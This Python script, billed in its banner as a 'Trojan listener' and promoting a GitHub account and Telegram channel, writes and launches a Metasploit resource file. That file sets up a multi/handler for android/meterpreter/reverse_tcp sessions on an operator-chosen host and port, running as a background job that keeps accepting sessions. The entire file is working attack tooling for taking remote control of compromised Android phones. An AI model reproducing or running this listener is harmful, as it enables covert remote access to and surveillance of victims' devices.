import os
import argparse
from termcolor import colored

ascii_art = r"""
   ██████╗ ███████╗███████╗
  ██╔═══╝ ██╔════╝██╔════╝
 █████╗   █████╗  █████╗  
 ╚═════╝   ╚════╝  ╚════╝  
╔════════════════════════════════════╗
║                                    ║
║         READY TO INITIATE          ║
║           TROJAN LISTENER          ║
║                                    ║
╚════════════════════════════════════╝
"""

github_banner = colored(
    """
🌟 Check Out My GitHub for More Scripts and Projects:
   https://github.com/inits5/""", 'white', 'on_dark_grey', attrs=['bold']
)

telegram_banner = colored(
    """
📢 Follow My Telegram Channel for Updates and Guides:
   https://t.me/scripted_seer""", 'white', 'on_blue', attrs=['bold']
)   

print(colored(ascii_art, 'cyan', attrs=['bold']))
print(github_banner)
print(telegram_banner)

if os.geteuid() != 0:
    print(colored("\n🚨 Permission Denied: Please run this script as root or use sudo.", 'red', attrs=['bold']))
    exit(1)

parser = argparse.ArgumentParser(
    description=colored(
        "🔧 Metasploit Listener Setup: Configure your listener for incoming payloads.",
        'green', attrs=['bold']
    ),
    formatter_class=argparse.RawTextHelpFormatter
)

parser.add_argument('-l', '--lhost', required=True, help=colored("🌐 Local IP address (e.g., 192.168.1.100)", 'yellow'))
parser.add_argument('-p', '--lport', required=True, help=colored("📡 Port for the listener (e.g., 4444)", 'yellow'))

args = parser.parse_args()

LHOST = args.lhost
LPORT = args.lport

listener_file = "listener.rc"
print(colored("\n🛠️ Setting up the listener configuration... Please wait.", 'blue'))
try:
    with open(listener_file, 'w') as f:
        f.write(f"""
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {LHOST}
set LPORT {LPORT}
set ExitOnSession false
exploit -j -z
""")
    print(colored(f"\n✅ Listener settings saved in: {listener_file}.", 'green', attrs=['bold']))
except Exception as e:
    print(colored(f"\n❌ Error: Unable to create listener file. {str(e)}", 'red'))
    exit(1)

try:
    print(colored("\n🚀 Starting Metasploit with the listener settings... Let’s go!", 'yellow'))
    os.system(f"msfconsole -r {listener_file}")
except KeyboardInterrupt:
    print(colored("\n✋ Metasploit execution interrupted. You can always restart it.", 'red', attrs=['bold']))
